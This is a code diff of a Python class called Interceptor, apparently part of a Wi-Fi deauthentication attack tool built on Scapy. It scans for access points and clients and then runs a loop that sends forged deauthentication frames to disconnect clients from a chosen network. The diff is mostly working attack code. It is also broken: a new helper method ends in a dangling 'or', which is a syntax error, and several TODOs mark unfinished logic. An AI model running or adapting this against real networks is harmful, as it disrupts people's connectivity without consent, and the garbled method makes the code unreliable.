@@ -63,15 +63,15 @@ class Interceptor:
             if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
-                if ap_mac == self._BROADCAST_MACADDR:
+                if ap_mac == self._BROADCAST_MACADDR:  # TODO should not happen for these pkt types
                     return
                 if ssid not in self._active_aps:
                     self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num)
                     printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
-                c_mac = str(pkt.addr1)
-                if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
-                    # todo check type of pkt instead
-                    self._active_aps[ssid]["clients"].append(c_mac)
+                if pkt.haslayer(Dot11ProbeResp):
+                    c_mac = str(pkt.addr1)
+                    if c_mac not in self._active_aps[ssid]["clients"]:  # TODO check broadcast
+                        self._active_aps[ssid]["clients"].append(c_mac)
                 self._current_channel_aps.add(ssid)
         except:
             pass
@@ -106,7 +106,7 @@ class Interceptor:
         for ssid, ssid_stats in self._active_aps.items():
             ctr += 1
             target_map[ctr] = ssid
-            pref = f"[{ctr}] "
+            pref = f"[{str(ctr).ljust(3, ' ')}] "
             printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
         if not target_map:
             printf("[!] Not APs were found, quitting...")
@@ -125,7 +125,9 @@ class Interceptor:
 
     def _clients_sniff_cb(self, pkt):
         try:
-            if pkt.haslayer(Dot11Elt):
+            # TODO instead:  if p.type == 0 and p.subtype in (0, 2, 4): ?
+            if self._packet_confirms_client(pkt):
+            # if pkt.haslayer(Dot11Elt):
                 ap_mac = str(pkt.addr3)
                 ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                 if ssid == self.target_ssid:
@@ -135,6 +137,10 @@ class Interceptor:
                         self._active_aps[ssid]["clients"].append(c_mac)
         except:
             pass
+
+    def _packet_confirms_client(self, pkt):
+        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
+               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0) or
 
     def _listen_for_clients(self):
         printf(f"[*] Setting up a listener for new clients...")
@@ -157,7 +163,7 @@ class Interceptor:
         printf(f"[*] Starting de-auth loop...")
 
         possible_ap_mac_addrs = [self._active_aps[self.target_ssid]["mac_addr"]]
-        possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())
+        possible_ap_mac_addrs.extend(self._generate_possible_ap_mac_addrs())  # TODO is this really needed?
         
         rd_frm = RadioTap()
         deauth_frm = Dot11Deauth()
@@ -177,10 +183,14 @@ class Interceptor:
                           Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                           deauth_frm,
                           iface=self.interface)
-                    sendp(rd_frm /
-                          Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
-                          deauth_frm,
-                          iface=self.interface)  # todo broadcast works?
+                    # sendp(rd_frm /
+                    #       Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
+                    #       deauth_frm,
+                    #       iface=self.interface)
+                    # sendp(rd_frm /
+                    #       Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
+                    #       deauth_frm,
+                    #       iface=self.interface)  # todo broadcast works? beware you might disconnect the client from other networks
             sleep(self._deauth_intv)
 
     def run(self):
